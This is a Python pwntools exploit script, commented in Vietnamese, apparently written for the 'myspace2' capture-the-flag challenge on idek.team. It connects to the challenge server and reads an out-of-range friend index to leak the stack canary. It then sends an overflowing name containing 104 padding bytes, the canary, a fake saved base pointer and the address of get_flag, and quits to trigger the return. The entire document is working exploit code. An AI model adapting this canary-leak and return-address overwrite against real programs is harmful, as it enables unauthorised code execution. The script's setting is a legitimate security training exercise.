from pwn import *

# Cài đặt context
elf = context.binary = ELF('./myspace2')

# Kết nối
p = remote('myspace2.chal.idek.team', 1337)

# --- Bước 1: Leak Canary (Sử dụng lỗ hổng trong `display_friend`) ---
log.info("Bắt đầu leak canary với lỗ hổng `display_friend`...")

# Offset từ đầu mảng top_friends đến canary là 104 bytes.
# Mỗi index là 8 bytes, vậy index cần tìm là 104 / 8 = 13.
canary_index = 104 // 8

# Chọn option 3: Display Friend
p.sendlineafter(b'>> ', b'3')
# Gửi index 13 để trỏ đến canary
p.sendlineafter(b'Enter index to display (0-7): ', str(canary_index).encode())

# Chương trình sẽ in "Invalid index!\n" trước khi leak. Chúng ta cần đọc và bỏ qua nó.
p.recvuntil(b'Invalid index!\n')

# Đọc chính xác 8 bytes của canary mà hàm write() in ra.
canary = p.read(8)

if len(canary) != 8:
    log.error("Leak canary thất bại! Vẫn không lấy được đủ 8 bytes.")
    exit()

log.success(f"Canary leaked: {hex(u64(canary))}")


# --- Bước 2: Ghi đè địa chỉ trả về (Logic không đổi) ---
log.info("Bắt đầu tấn công ROP...")

get_flag_addr = elf.symbols['get_flag']
log.info(f"Địa chỉ của get_flag: {hex(get_flag_addr)}")

# Offset từ đầu mảng top_friends đến canary vẫn là 104 bytes
padding_to_canary = 104
rbp_padding = b'B' * 8

payload = flat([
    b'C' * padding_to_canary,
    canary,
    rbp_padding,
    get_flag_addr
])

# Chọn option 2: Edit Friend
p.sendlineafter(b'>> ', b'2')
p.sendlineafter(b'Enter index to edit (0-7): ', b'0')
p.sendlineafter(b'Enter new name: ', payload)

# Chọn option 4: Quit để trigger hàm ret
p.sendlineafter(b'>> ', b'4')
log.success("Payload đã gửi! Chương trình sẽ return tới get_flag.")

# Chuyển sang chế độ tương tác để nhận flag
p.interactive()